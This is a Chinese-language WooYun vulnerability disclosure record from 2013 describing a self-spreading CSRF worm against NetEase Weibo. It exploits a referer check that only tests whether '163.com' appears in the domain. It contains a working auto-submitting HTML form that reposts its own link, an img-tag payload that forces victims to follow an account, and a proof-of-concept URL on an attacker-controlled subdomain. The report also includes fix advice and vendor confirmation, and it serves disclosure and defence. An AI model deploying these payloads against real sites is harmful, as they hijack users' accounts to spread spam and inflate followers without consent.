{"id": 14316, "wybug_id": "wooyun-2013-017374", "wybug_title": "我是如何绕过网易防御、利用CSRF蠕虫继续刷粉丝的", "wybug_corp": "网易", "wybug_author": "风萧萧", "wybug_date": "2013-01-16 15:01", "wybug_open_date": "2013-03-02 15:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "设计不当", "蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-02：\t细节向公众公开  简要描述： 感谢@王小贱 @xsjswt提供的友情支持！高安全的就得交一些这样的朋友撒！ 详细说明：  1.既然是CSRF蠕虫，肯定是发微博的地方出了问题！接口在这里：\nPOST http://t.163.com/share/retweet HTTP/1.1Host: t.163.comProxy-Connection: keep-aliveContent-Length: 439Origin: http://t.163.comUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11Content-Type: application/x-www-form-urlencodedAccept: */*Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: 略status=%E6%AC%A7%E8%81%94%E5%B0%8F%E7%BB%84%E6%9C%AB%E8%BD%AE%E6%AC%A1%E6%97%A5%E7%BB%BC%E8%BF%B0%3A32%E5%BC%BA%E4%BA%A7%E7%94%9F+%E7%83%AD%E5%88%BA%E5%A4%A7%E8%83%9C%E5%87%BA%E5%B1%80http%3A%2F%2Fsports.163.com%2F11%2F1216%2F06%2F7LCJG29T00051F6Q.html&in_reply_to_status_id=&source=%E7%BD%91%E6%98%93%E4%BD%93%E8%82%B2&link=http%3A%2F%2Fsports.163.com%2F11%2F1216%2F06%2F7LCJG29T00051F6Q.html&imageUrl=&method=click&keyfrom=share163.share\n2.上述链接即为发微博的另一个接口（实际上应该是转发微博），简单说下参数，status参数即为发布的微博内容，这里是必填项，我可以把csrf蠕虫的载体做为链接发在这里，欺骗用户点击！参数in_reply_to_status_id默认不填，source选填项，表示微博从哪里转发过来的，link不知，不填也木关系，method和keyfrom默认即可！3.这里实际上是做referer判断的，即referer必须为163.com或者空，其他域不行。这意味着我是不是只能本地单机玩了啊！哈哈，经过长时间的测试，发现验证referer的正则表达式写的有问题！只是判断了域名是否包含有163.com，而不是验证根域名为163.com。那么我这里可以构造子域名t.163.com.test.av作为蠕虫传播的载体服务器，即可绕过。   漏洞证明：  4.非常感谢@xsjswt提供的子域名，我的POC在下面这个链接：\nhttp://t.163.com.xsjswt.3322.org/admin/sessiondata/csrf.html\n一并将代码拷贝如下：\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head><body><form id=\"fxx\" name=\"fxx\" action=\"http://t.163.com/share/retweet\" method=\"POST\"><input type=\"text\" name=\"status\" value=\"缘深缘浅，路长路短，看见就好...http://t.163.com.xsjswt.3322.org/admin/sessiondata/csrf.html\" /><input type=\"text\" name=\"in_reply_to_status_id\" value=\"\" /><input type=\"text\" name=\"source\" value=\"风萧萧兮易水寒\" /><input type=\"text\" name=\"link\" value=\"http://t.163.com.xsjswt.3322.org/admin/sessiondata/csrf.html\" /><input type=\"text\" name=\"imageUrl\" value=\"\" /><input type=\"text\" name=\"method\" value=\"click\" /><input type=\"text\" name=\"keyfrom\" value=\"share163.share\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.fxx.submit();</script></body></html>\n5.Chrome登录风萧萧吸的微博账号发布微博如下：\n\n6.Firefox登录另一个网易微博账号：\n\n7.受害者点击上述短链接，服务器访问如下：\n\n8.再查看主页面，发布了一条同样的微博哦：\n\n   修复方案：  1.其实中间遇到了不少问题，referer为空可以绕过防御，所以方便了本地测试。但是原数据包纹风不动的提交可以正常发布微博的，但是放在POC里，本地提交总是返回【var updatestatus = 400】。后来才知道是编码的问题，服务器端只认UTF-8。2.既然referer域名可以改成t.163.com.test.av是可以的，那么改成test.av/csrf.php?163.com呢，是不是可以呢？这个以后大家当做小的细节来考虑吧！3.既然上面的蠕虫已经实现，刷粉丝就可以更容易了，在POC里加如下代码可点击即关注：\n<img src=http://t.163.com/share/follow?followfrom=op.wz.gfo&keyfrom=op.wz.gfo&sitechannel=no&method=follow&screenName=【微博ID】/>\n4.在防御方面，强烈建议：关键请求还是改成post比较好！关键请求还是加token比较好！5.另外，不管怎样我还是来求个礼物吧！   版权声明：转载请注明来源 风萧萧@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-01-17 18:40 厂商回复： 感谢您对网易的关注，漏洞已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-16 15:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  逆天    \n     2013-01-16 15:23 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  哈哈哈哈哈哈，标题被猜中！碉堡！    \n     2013-01-16 15:57 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  果然    \n     2013-01-16 16:30 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @小胖子 @VIP 友情预测下一个漏洞是什么吧！    \n     2013-01-16 16:33 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @风萧萧 我是如何刷搜狐微博粉丝的，我是如何绕过搜狐微博限制继续刷粉丝的！！！！    \n     2013-01-16 16:33 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @风萧萧 我又是如何日刷千万网易微博粉丝的    \n     2013-01-16 16:49 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @小胖子 为什么是搜狐？    \n     2013-01-16 16:49 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  ！！！！！！！！！！！！！！！！！！！！！！！！    \n     2013-01-16 16:58 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @风萧萧 几个大厂商，一人来一炮。    \n     2013-01-16 17:00 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  来顶一下    \n     2013-01-16 17:01 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Sogili 只有互相安慰才不会冷啊    \n     2013-01-16 21:31 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @Sogili 哎。。。。。。    \n     2013-01-16 21:33 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @Sogili http://t.163.com@xsser.me/csrf.html是不是更吊！    \n     2013-01-16 22:04 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  @风萧萧 & &    \n     2013-01-16 22:05 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @Sogili ⊙﹏⊙b汗 失误了    \n     2013-01-17 19:11 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  我是如何绕过百度服务器防火墙挂百度主页的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}